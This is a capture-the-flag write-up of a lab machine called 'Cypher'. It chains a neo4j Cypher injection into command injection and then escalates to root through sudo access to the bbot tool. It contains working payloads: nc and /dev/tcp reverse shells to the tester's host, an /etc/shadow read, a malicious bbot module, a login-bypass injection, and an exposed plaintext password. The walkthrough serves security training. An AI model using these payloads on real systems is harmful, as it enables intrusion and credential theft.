description: Cypher is running a web server which has an exposed testing directory which contains a jar file. Analyzing the jar file and the login page on the site leads us to a neo4j cypher injection exploit which when calling a custom function on the jar file leads to RCE. Through this we are able to get a reverse shell. Looking through the bash history file we find the password of the user. The user is able to run bbot, an osint script as root. Using this script we can take advantage of debug mode and set a custom YARA file to get an arbitrary file read. We can also write a custom module to achieve code execution as root.

# Information Gathering
## Enumeration
We are given a target ip address: `10.129.216.175`
Let's start off with an `nmap` scan:

```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)

| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We can see we have two services on open ports:
- `ssh` : `22`
- `http`: `80`

The http service is attempting to redirect us to `cypher.htb` so let's add this to our hosts file:

```
echo "$TARGET cypher.htb" | sudo tee -a /etc/hosts

10.129.216.175 cypher.htb
```

## Cypher.htb
When we visit the `http` webserver we are greeted with the following webpage:

![Cypher-1740862262642.png](/assets/img/img_Cypher/Cypher-1740862262642.png)

### Login

Looking at the login page we have the following:

![Cypher-1740862588566.png](/assets/img/img_Cypher/Cypher-1740862588566.png)

We can attempt to do a simple `SQLi` using the following payload:

```
a' OR 1=1 -- -
```

Which results in the following:

```
Traceback (most recent call last):

^}

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
File "/app/app.py", line 165, in login
creds_valid = verify_creds(username, password)
File "/app/app.py", line 151, in verify_creds

"MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.name = 'a' OR 1=1 -- -' return h.value as hash"
^}
```

Looking at the last line we can see a `neo4j cypher` query.

> Cypher is neo4j's graph query language, it is a NoSQL language similar to SQL with the difference being that it is a graph based database rather than a relationship oriented one.

### Jar File

Doing a directory scan we find the following:

```
/login                (Status: 200) [Size: 3671]
/api                  (Status: 307) [Size: 0] [--> /api/docs]
/about                (Status: 200) [Size: 4986]
/demo                 (Status: 307) [Size: 0] [--> /login]
/index                (Status: 200) [Size: 4562]
/testing              (Status: 301) [Size: 178] [--> http://cypher.htb/testing/]
```

In `https://cypher.htb/testing` we can find and download a `jar` file:

![Cypher-1740862889131.png](/assets/img/img_Cypher/Cypher-1740862889131.png)

Let's use `jd-gui` to decompile it:

![Cypher-1740863822365.png](/assets/img/img_Cypher/Cypher-1740863822365.png)

We can spot a line potentially vulnerable to code injection in the `CustomFunciton` class:

```java
String[] command = { "/bin/sh", "-c", "curl -s -o /dev/null --connect-timeout 1 -w %{http_code} " + url };
```

# Foothold
Given the things we've found we can attempt a `Cyphher Injection` combined with a `command injection`. Since we know it's a `neo4j cypher` query we can use [Cypher Injection Cheatsheet](https://pentester.land/blog/cypher-injection-cheatsheet/) as a guide.

Since we have already identified `error-based` detection and have found a function call let's try and call back our local machine by specifying the url to be our local machine.

Let's start a listener:

```
nc -lvnp 80

listening on [any] 80 ...
```

And use the following payload to call the function:

```
1' OR 1=1 CALL custom.getUrlStatusCode('http://10.10.14.158') YIELD statusCode RETURN statusCode //
```

Success! we get the following callback:

```
connect to [10.10.14.158] from (UNKNOWN) [10.129.217.181] 53120
GET / HTTP/1.1
Host: 10.10.14.158
User-Agent: curl/8.5.0
Accept: */*
```

since the `url` parameter is injected directly into a bash command we can attempt code execution using the following payload:

```
1' OR 1=1 CALL custom.getUrlStatusCode('; whoami | nc 10.10.14.158 80') YIELD statusCode RETURN statusCode //
```

> I am using `nc` to get the command output called back to our listener as we cannot directly view the output of commands injected.
{:.info}

We're `neo4j` user!

```
connect to [10.10.14.158] from (UNKNOWN) [10.129.217.181] 37558
neo4j
```

Let's inject a reverse shell:

```
1' OR 1=1 CALL custom.getUrlStatusCode('; bash -c "bash -i >& /dev/tcp/10.10.14.158/9001 0>&1"') YIELD statusCode RETURN statusCode //
```

We get a reverse shell on our listener!

```
nc -lvnp 9001 
listening on [any] 9001 ...
connect to [10.10.14.158] from (UNKNOWN) [10.129.217.181] 35072
bash: cannot set terminal process group (1410): Inappropriate ioctl for device
bash: no job control in this shell
neo4j@cypher:/$ 
```

# User
Looking around in `/var/lib/neo4j` we find a password in `.bash_history`

```
neo4j@cypher:~$ cat .bash_history
neo4j-admin dbms set-initial-password [REDACTED]
```

As well as the user `graphasm`:

```
neo4j@cypher:~$ ls /home
graphasm
```

Let's attempt to reuse these credentials:

```
neo4j@cypher:~$ su graphasm
Password: 
graphasm@cypher:/var/lib/neo4j$ 
```

Success! This shell is a little unstable so let's `ssh` into the system instead:

```
ssh graphasm@cypher.htb
graphasm@cypher.htb's password:

# Root
Checking `graphasm`'s privileges we see we can run `bbot` as root without a password:

```
graphasm@cypher:~$ sudo -l
Matching Defaults entries for graphasm on cypher:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User graphasm may run the following commands on cypher:
    (ALL) NOPASSWD: /usr/local/bin/bbot
```

We can also find a `bbot_preset.yml` in our home directory:

```
graphasm@cypher:~$ ls -la
total 36
drwxr-xr-x 4 graphasm graphasm 4096 Feb 17 12:40 .

-rw-r----- 1 root     graphasm   33 Mar  1 20:37 user.txt
```

Looking around we find out that [bbot](https://github.com/blacklanternsecurity/bbot) is an OSINT tool.

Let's look at our preset:

```
graphasm@cypher:~$ cat bbot_preset.yml 
targets:
  - ecorp.htb

output_dir: /home/graphasm/bbot_scans

config:
  modules:
    neo4j:
      username: neo4j
      password: cU4btyib.20xtCMCXkBmerhK
```

Nothing very interesting, looking at the `help` for the binary we can see a few interesting options:
- `-cy` : custom YARA rules, can take file input
- `-d` : debug mode, increases verbosity
- `--dry-run`: exit before doing any actual scans

Using these three flags we have an arbitrary file read by specifying the file we want to read as the custom YARA rule:

```
sudo bbot -cy /etc/shadow -d --dry-run

```

Additionally we can [create a custom module](https://www.blacklanternsecurity.com/bbot/Stable/dev/module_howto/) that leads to code execution as root on the machine:

```python
from bbot.modules.base import BaseModule
import os

class poc(BaseModule):
    async def setup(self):
        os.system('bash -c "bash -i >&/dev/tcp/10.10.14.158/9001 0>&1"')
```

As instructed let's create a `preset.yml` file to determine the location of our custom module:

```yml
# load BBOT modules from these additional paths
module_dirs:
  - /home/graphasm
```

Let's run it with our custom module selected:

```bash
sudo bbot -m poc -p /home/graphasm/preset.yml
```

We get a root shell on our listener!:

```bash
nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.158] from (UNKNOWN) [10.129.217.181] 41800
root@cypher:/home/graphasm# 
```

# Beyond Root
We can in fact bypass the `login` using our `cypher injection` which I think was the original intended method because if it wasn't then the demo page would be redundant. Looking at the error messages we see the following values are being returned: `u.name` and `hash`
```
MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.name = 'a' return h.value as hash
```

This indicates that it's matching the username and password hash through the database and returning them to the webserver for comparison. So we can actually return any value we want for the hash and then use that same value in the password field and we should be granted access.


So let's create a sha1sum for the password we'll use, I'll use `password`:

```
echo -n 'password' | sha1sum

5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8 -
```

Then let's inject the following payload into our username field:

```
1' OR 1=1 RETURN u.name, '5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8' AS hash //
```

and `password` into our password field.

We get redirected into a `/demo` page, where we can input any query we want:

We may also use this for the RCE:
